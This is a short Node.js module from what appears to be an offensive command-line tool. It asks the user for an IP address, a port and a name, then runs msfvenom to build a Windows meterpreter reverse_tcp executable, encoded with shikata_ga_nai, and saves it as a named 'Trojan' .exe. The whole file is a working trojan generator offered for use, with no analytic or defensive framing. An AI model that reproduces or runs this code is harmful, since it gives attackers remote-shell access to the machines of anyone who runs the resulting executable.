const inquirer = require("inquirer");
exports.newTrojan = (exec, q) => {
  var deferred = q.defer();

  inquirer
  // Collecting information from the user
    .prompt([
      {
        type: "input",
        message: "Enter you ip address",
        name: "ip",
      },
      {
        type: "input",
        message: "Enter desired port",
        name: "port",
        default: "3333",
      },
      {
        type: "input",
        message: "Enter a creative name for your Trojan",
        name: "TrojanName",
      },
    ])
    .then((answer) => {
      //Function to create the Trojan file and saves it within bin folder as an executable file
      const newTrojan =
        `msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp` +
        ` LHOST=${answer.ip} LPORT=${answer.port} -b x00 -e x86/shikata_ga_nai -f exe -o bin/${answer.TrojanName}.exe`;
      
        //Error Handling
      exec(newTrojan, (error, stdout, stderr) => {
        return error
          ? deferred.reject(stderr + new Error(error.stack || error))
          : deferred.resolve(stdout);
      });
    })
    .catch((error) => {
      console.log(error);
    });

  return deferred.promise;
};
